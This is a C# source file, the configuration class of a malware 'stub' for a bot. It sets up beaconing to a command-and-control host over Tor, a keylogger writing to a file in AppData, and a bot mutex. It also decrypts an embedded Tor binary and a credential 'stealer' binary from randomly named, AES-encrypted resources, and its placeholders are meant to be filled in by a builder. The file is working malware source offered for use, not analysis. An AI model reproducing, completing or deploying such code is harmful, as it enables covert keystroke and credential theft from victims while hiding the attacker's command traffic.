using System;
using System.Resources;
using System.Reflection;

using Stub.Utilities;
using Stub.Security;

namespace Stub.Core.Config
{
    class CConfig
    {
        //Socket Settings
        public String Host;
        public Int32 Port;
        public Int32 Interval;

        //Tor Settings
        public String Tor_Host = "127.0.0.1";
        public Int32 Tor_Port = 9050;
        public Boolean Tor_Enabled = true;
        public Byte[] Tor_Binary = null;

        //Bot Settings
        public String BotVersion = "1.1.1.0";

        //Keylogger Settings
        public string strKeylogFileName = string.Concat(CUtils.GetAppData(), "keylog.dat");

#if !DEBUG
        public String AES_Key;
#endif
        //Stealer
        public Byte[] Stealer_Binary = null;

        //Mutex
        public string BotMutex = "{MUTEX_HERE}";

        public CConfig()
        {
#if DEBUG
            Host = "127.0.0.1";
            Port = 81;
            Interval = 1 * 60000;
#else
            AES_Key = "{AES_KEY_HERE}";

            CAES AES = new CAES(AES_Key);

            string[] arr_strSettings = AES.Decrypt("{SETTINGS_HERE}").Split('|');
            /*
             * [0] = Host
             * [1] = Port
             * [2] = Interval
             */
            Host = arr_strSettings[0];
            if (!int.TryParse(arr_strSettings[1], out this.Port)) return;
            if (!int.TryParse(arr_strSettings[2], out this.Interval)) return;
            this.Interval *= 60000;

            try
            {
                ResourceManager rmManager = new ResourceManager("{RAND_RES_NAME}", Assembly.GetExecutingAssembly());
                Tor_Binary = AES.Decrypt((byte[])rmManager.GetObject("{RAND_TOR_NAME}"));
                Stealer_Binary = AES.Decrypt((byte[])rmManager.GetObject("{RAND_STEALER_NAME}"));
                rmManager.ReleaseAllResources();
            }
            catch
            {
            	Environment.Exit(0);
            }
#endif
        }
    }
}
